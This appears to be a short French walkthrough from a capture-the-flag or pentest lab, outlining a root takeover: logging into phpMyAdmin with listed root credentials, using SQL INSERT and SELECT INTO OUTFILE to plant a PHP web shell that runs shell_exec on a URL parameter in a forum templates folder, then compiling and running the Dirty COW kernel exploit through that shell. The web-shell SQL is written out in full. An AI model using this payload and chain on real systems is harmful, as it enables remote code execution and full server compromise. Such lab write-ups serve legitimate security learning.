
#### Le but ici est de faire une dirtycow via SQL.

Il faut pour cela se connecter sur l'interface de phpmyadmin ( credentials : root / Fg-'kKXBj87E:aJ$ )

1/ Creer une backdoor permettant d'executer du code via phpmyadmin ( Dossier vise : /var/www/forum/templates_c ) *
2/ Creer un fichier source en C contenant la dirtycow ( CF write_dirty.sql )
3/ Via la backdoor, compiler le fichier c ( cc toto.c -lcrypt -lpthread )
4/ L'executer ( ./a.out some_password ) ; attendre quelque secondes ( Une dizaine semble suffir )
5/ Se connecter avec les credentials root / some_password


*
```sql
; Rappel : Creer une backdoor

INSERT INTO
	`mlf2_pages`
	(
		`order_id`,
		`title`,
		`content`,
		`menu_linkname`,
		`access`
	)
	VALUES
		(
			 0,
			 "",
			 '<? echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>',
			 "",
			 0
		);

SELECT
	`content`
FROM
	`mlf2_pages`
WHERE
	id = 1
INTO OUTFILE
	"/var/www/forum/templates_c/index.php"
```
